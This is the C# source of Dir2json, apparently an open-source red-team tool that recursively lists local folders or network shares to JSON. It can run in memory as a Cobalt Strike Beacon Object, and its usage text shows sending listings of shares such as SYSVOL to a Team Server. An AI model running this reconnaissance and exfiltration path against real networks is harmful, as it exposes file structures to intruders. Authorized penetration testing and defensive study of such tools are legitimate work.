using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using static Dir2json.Helpers;
#if BOFBUILD
using BOFNET;
#endif

/*
Author: @bitsadmin
Website: https://github.com/bitsadmin/dir2json
License: BSD 3-Clause
*/

namespace Dir2json
{
#if BOFBUILD
    public partial class Program : BeaconObject
    {
        public override void Go(string[] args)
        {
            bofnet = this;
#else
    partial class Program
    {
        public static void Main(string[] args)
        {
#endif
            // Title
            WriteErrorLine(TITLE);

            // Parse arguments
            if (args.Length == 0)
            {
                Usage();
                return;
            }

            Args arguments;
            try
            {
                arguments = new Args(args);

                // Warn user before starting the enumeration if Cobalt Strike download is specified, but it is not
                // executed in the Cobalt Strike context
                if ((arguments.OutputType & OutputTypes.CobaltStrikeDl) != 0 && bofnet == null)
                    throw new ArgumentException("Attempting to request a Cobalt Strike in-memory download from a non-beacon context.");
            }
            catch (ArgumentException ex)
            {
                WriteErrorLine("[-] Error: {0}", ex.Message);
                Usage();
                return;
            }

            // Create root node
            rootNode = CreateRootNode(arguments);
            recursionTree.Add(rootNode);

            // Recurse filesystem
            WriteErrorLine("[+] Enumerating path \"{0}\"", GetCleanPath(arguments.ListPath));
            EnumerateRecursively(arguments.ListPath, 0, arguments, arguments.MaxDepth, arguments.EntriesPerFile);

            // Send (last) results to specified output
            int seqNr = 0;
            if (arguments.EntriesPerFile > 0)
            {
                seqNr = (int)Math.Round((double)(currentEntries / arguments.EntriesPerFile), 0) + 1;
            }
            SendToOutput(arguments, rootNode, seqNr);
            WriteErrorLine("[+] Done!");

            // Cleanup memory
            RunGarbageCollector(rootNode);
        }

        private static FSNode rootNode;
        private static StackList<FSNode> recursionTree = new StackList<FSNode>();
        private static ulong currentEntries = 0;

        static void EnumerateRecursively(string path, int recursionDepth, Args arguments, uint remainingDepth, UInt64 MaxEntries)
        {
            FSNode parent = recursionTree[recursionDepth];

            WIN32_FIND_DATA findData;
            SafeFindHandle findHandle = FindFirstFile(path + "*", out findData);

            if (findHandle.IsInvalid)
            {
                int error = System.Runtime.InteropServices.Marshal.GetLastWin32Error();
                WriteErrorLine("Error 0x{0:X8} @ \"{1}\"", error, GetCleanPath(path));
                return;
            }

            bool found = false;
            do
            {
                // Name of directory or file
                string currentName = findData.cFileName;

                // LastWriteTime
                FILETIME ft = findData.ftLastWriteTime;
                long lastWriteTime = ((long)ft.dwHighDateTime << 32) | (uint)ft.dwLowDateTime;

                // Directories
                if ((findData.dwFileAttributes & FileAttributes.Directory) != 0)
                {
                    // Skip current/parent directory
                    if (currentName == "." || currentName == "..")
                    {
                        found = FindNextFile(findHandle, out findData);
                        continue;
                    }

                    // Collect directory
                    FSNode dirNode = new FSNode()
                    {
                        Name = currentName,
                        Attributes = findData.dwFileAttributes,
                        LastWriteTime = lastWriteTime,
                        ParentNode = parent,
                        Size = 1
                    };

                    parent.SubNodes.Add(dirNode);

                    // - Stop if MaxDepth value has been reached
                    // - Enter the symlinked directory if the FollowSymlinks flag has been provided,
                    //   or in case the current directory is not a symlink
                    if (remainingDepth > 0 && (arguments.FollowSymlinks || (findData.dwFileAttributes & FileAttributes.ReparsePoint) == 0))
                    {
                        string childPath = Path.Combine(path, dirNode.Name);
                        recursionTree.Add(dirNode);
                        EnumerateRecursively(childPath + @"\", recursionDepth + 1, arguments, remainingDepth - 1, MaxEntries);
                        recursionTree.Pop();

                        // Parent can have been updated in the meanwhile
                        parent = recursionTree[recursionDepth];
                    }
                }
                // Files
                else
                {
                    // File size
                    long fileSize = ((long)findData.nFileSizeHigh << 32) | (uint)findData.nFileSizeLow;

                    // Collect file
                    FSNode fileNode = new FSNode()
                    {
                        Name = currentName,
                        Attributes = findData.dwFileAttributes,
                        LastWriteTime = lastWriteTime,
                        ParentNode = parent,
                        Size = fileSize
                    };

                    parent.SubNodes.Add(fileNode);
                }

                // Download if MaxEntries is set and has been reached
                if (MaxEntries > 0  && currentEntries != 0 && (currentEntries % MaxEntries == 0))
                {
                    // Collect recursion tree
                    List<FSNode> recursionTreeNew = new List<FSNode>();
                    while(recursionTree.Count > 0)
                    {
                        FSNode node = recursionTree.Pop();

                        // Make a full clone
                        recursionTreeNew.Add(
                            new FSNode()
                            {
                                Name = node.Name,
                                Attributes = node.Attributes,
                                Size = node.Size,
                                LastWriteTime = node.LastWriteTime
                            }
                        );
                    }

                    // Rebuild nodes structure
                    // 1) Set childnode
                    FSNode previousFolder = null;
                    foreach (FSNode currentFolder in recursionTreeNew)
                    {
                        if (previousFolder == null)
                        {
                            previousFolder = currentFolder;
                            continue;
                        }

                        currentFolder.SubNodes.Add(previousFolder);
                        previousFolder = currentFolder;
                    }

                    // 2) Set parent nodes
                    recursionTreeNew.Reverse();
                    previousFolder = null;
                    foreach (FSNode currentFolder in recursionTreeNew)
                    {
                        if(previousFolder == null)
                        {
                            previousFolder = currentFolder;
                            continue;
                        }

                        currentFolder.ParentNode = previousFolder;
                        previousFolder = currentFolder;
                    }

                    // Calculate sequence number
                    int seqNr = (int)Math.Round((double)(currentEntries / MaxEntries), 0);

                    // Send download; also cleans up memory
                    SendToOutput(arguments, rootNode, seqNr);

                    // Re-set root and parent
                    rootNode = recursionTreeNew[0];
                    foreach(FSNode currentFolder in recursionTreeNew)
                    {
                        recursionTree.Add(currentFolder);
                    }
                    parent = recursionTree.Peek();
                }

                // Find next
                found = FindNextFile(findHandle, out findData);

                // Increase counter
                currentEntries += 1;
            }
            while (found);
        }

        private static FSNode CreateRootNode(Args arguments)
        {
            // Determine properties of root path
            string dirName = arguments.ListPath.Replace("\\?\\UNC", "").Replace(@"\\?\", "");
            FileAttributes dirAttributes = 0;
            long dirLastWriteTime = 0;
            try
            {
                DirectoryInfo directory = new DirectoryInfo(dirName);
                dirName = directory.FullName;
                dirAttributes = directory.Attributes;
                dirLastWriteTime = directory.LastWriteTime.ToFileTimeUtc();
            }
            catch (Exception)
            { }

            FSNode root = new FSNode()
            {
                Name = dirName,
                Attributes = dirAttributes,
                LastWriteTime = dirLastWriteTime
            };

            return root;
        }

        private static void SendToOutput(Args arguments, FSNode root, int seqNr)
        {
            // Serialize to JSON
            using (MemoryStream json = JsonHelper.To<FSNode>(root))
            {
                // Clear nodes as from now we will work with the serialized JSON
                RunGarbageCollector(root);

                // Compressed
                if ((arguments.OutputType & OutputTypes.Gzipped) != 0)
                {
                    WriteErrorLine("[+] Compressing JSON output");

                    using (MemoryStream gzcompressed = Compress(json))
                    {
                        GC.Collect();
                        GC.WaitForPendingFinalizers();

                        // Output b64(gzip(JSON)) to console
                        if ((arguments.OutputType & OutputTypes.Console) != 0)
                        {
                            // Convert to base64
                            string b64 = Convert.ToBase64String(gzcompressed.ToArray());

                            // Print to console
                            WriteErrorLine("[+] b64(gzip(JSON)) incoming!");
                            WriteErrorLine(SEPARATOR);
                            WriteLine(b64);
                            WriteErrorLine(SEPARATOR);
                        }

                        // Store gzip(JSON) to file
                        else if ((arguments.OutputType & OutputTypes.File) != 0)
                        {
                            string filename = GetSequencePath(arguments.OutFileName, seqNr);
                            WriteErrorLine("[+] Storing gzipped JSON in \"{0}\"", filename);
                            try
                            {
                                using (FileStream f = File.Create(filename))
                                {
                                    gzcompressed.CopyTo(f);
                                }
                            }
                            catch (Exception e)
                            {
                                WriteErrorLine("[-] Error saving file: {0}", e.Message);
                            }
                        }

                        // Send gzip(JSON) to Cobalt Strike
                        else if ((arguments.OutputType & OutputTypes.CobaltStrikeDl) != 0)
                        {
                            string filename = string.Format("{0}.json.gz", GetSequencePath(GenerateJsonFileName(arguments.ListPath), seqNr));
                            WriteErrorLine("[+] Downloading {0} to Cobalt Strike", filename);
                            CobaltStrikeDownload(filename, gzcompressed);
                        }
                    }
                }
                // Not compressed
                else
                {
                    // Output JSON to console
                    if ((arguments.OutputType & OutputTypes.Console) != 0)
                    {
                        // Convert stream to string
                        byte[] iso88591 = Encoding.Convert(Encoding.UTF8, Encoding.GetEncoding(28591), json.ToArray());
                        string jsonStr = Encoding.Default.GetString(iso88591);

                        // Send to console
                        WriteErrorLine("[+] JSON incoming!");
                        WriteErrorLine(SEPARATOR);
                        WriteLine(jsonStr);
                        WriteErrorLine(SEPARATOR);
                    }

                    // Store JSON to file
                    else if ((arguments.OutputType & OutputTypes.File) != 0)
                    {
                        string filename = GetSequencePath(arguments.OutFileName, seqNr);
                        WriteErrorLine("[+] Storing JSON in \"{0}\"", filename);
                        try
                        {
                            using (FileStream fs = new FileStream(filename, FileMode.Create))
                            {
                                json.CopyTo(fs);
                            }
                        }
                        catch (Exception e)
                        {
                            WriteErrorLine("[-] Error saving file: {0}", e.Message);
                        }
                    }

                    // Send JSON to Cobalt Strike
                    else if ((arguments.OutputType & OutputTypes.CobaltStrikeDl) != 0)
                    {
                        string filename = string.Format("{0}.json", GetSequencePath(GenerateJsonFileName(arguments.OutFileName), seqNr));
                        WriteErrorLine("[+] Downloading {0} to Cobalt Strike", filename);
                        CobaltStrikeDownload(filename, json);
                    }
                }
            }
        }

        // Cleanup
        // For some reason the .NET Large Object Heap is not cleaned up when execution in BOF.NET finishes.
        // These lines force the release of memory.
        public static void RunGarbageCollector(FSNode root)
        {
            root.SubNodes.Clear();
            GC.Collect();
            GC.WaitForPendingFinalizers();
        }

        public static string GetSequencePath(string path, int seqNr)
        {
            if (seqNr == 0)
                return path;

            // Create path with filename with sequence number
            string folder = Path.GetDirectoryName(path);
            string filename = Path.GetFileName(path);
            string ext, filenamenoext;
            if(filename.EndsWith(".json.gz", StringComparison.InvariantCultureIgnoreCase))
            {
                ext = ".json.gz";
                filenamenoext = filename.Replace(".json.gz", "");
            }
            else
            {
                ext = Path.GetExtension(filename);
                filenamenoext = Path.GetFileNameWithoutExtension(filename);
            }

            // Compile new folder name
            string seqNrStr = string.Format("_{0:000}", seqNr);
            string newfilename = string.Format("{0}{1}{2}", filenamenoext, seqNrStr, ext);

            // Return
            return Path.Combine(folder, newfilename);
        }

        private static readonly string TITLE = @"
== Dir2json v1.0 ==
Twitter: @bitsadmin
Website: https://github.com/bitsadmin/dir2json
";
        private static readonly string SEPARATOR = new string('-', 80);

        static void Usage()
        {
            string exeFile = Path.GetFileName(System.Reflection.Assembly.GetExecutingAssembly().Location);

            WriteErrorLine(
@"
Usage: {0} drive:path output [/MaxDepth=value] [/EntriesPerFile=value] [/FollowSymlinks]
    drive:path
            Specifies drive and/or directory

    output
            Output possibilities
             [filename]     Save output to disk. If the .gz extension is used, it is first compressed
                            E.g. dir2json.json saves JSON to disk; dir2json.json.gz, saves gzip(JSON) to disk
             con            Outputs base64(gzip(JSON)) to console
             conraw         Outputs JSON to console
             cs             Downloads the compressed gzip to the Cobalt Strike Team Server using the
                            undocumented download functionality
             csraw          Downloads the plain JSON to the Cobalt Strike Team Server using the
                            undocumented download functionality

    [/MaxDepth=value]
            Only recurses until a certain depth from the specified directory. Default: 999. Setting the value to 0
            also makes it set to depth 999.

    [/EntriesPerFile=value]
            Maximum entries per file (x 1000). Makes sure that memory is periodically flushed. Default: 0 meaning ∞
            For example 10 means that after 10.000 entries the file will be saved/downloaded and memory cleaned up.

    [/FollowSymlinks]
            By default symlinks are not followed because they could lead to infinite loops resulting in a crash of the
            application. This flag enables following symlinks. In combination with the /MaxDepth such infinite loop can
            be avoided.


Examples:
    Enumerate drive C and store in compressed file drive_C.json.gz in the current directory
    dir2json C:\ drive_C.json.gz

    Enumerate the SYSVOL share on DC01, following sybmolic links and splitting the output in 10.000 entries per file
    dir2json \\DC01\SYSVOL\ C:\Temp\SYSVOL.json /FollowSymlinks /MaxDepth=32 /EntriesPerFile=10

    Enumerate the C:\Users directory with maximum recursion depth of 5 and output the JSON to the console window
    dir2json C:\Users\ conraw /MaxDepth=5


    Load BOFNET and Dir2json in Cobalt Strike for in-memory execution
    bofnet_init
    bofnet_load /path/to/Dir2json/Dir2json.dll

    Enumerate drive C splitting the output up in 100.000 entries per file, having the
    resulting compressed .json.gz files downloaded to the Team Server
    bofnet_execute Dir2json.Program C:\ cs /EntriesPerFile=100

    Enumerate the Backup share on MYSERVER downloading the compressed .json.gz file to the Team Server
    bofnet_execute Dir2json.Program \\MYSERVER\Backup\ cs

    Enumerate the C:\Users\bitsadmin directory and download the .json file to the Team Server
    bofnet_execute Dir2json.Program C:\Users\bitsadmin\ csraw

    Enumerate drive X storing the output on the machine running the beacon in C:\Temp\Drive_X.json.gz
    bofnet_execute Dir2json.Program C:\ C:\Temp\Drive_X.json.gz", exeFile);
        }
    }
}
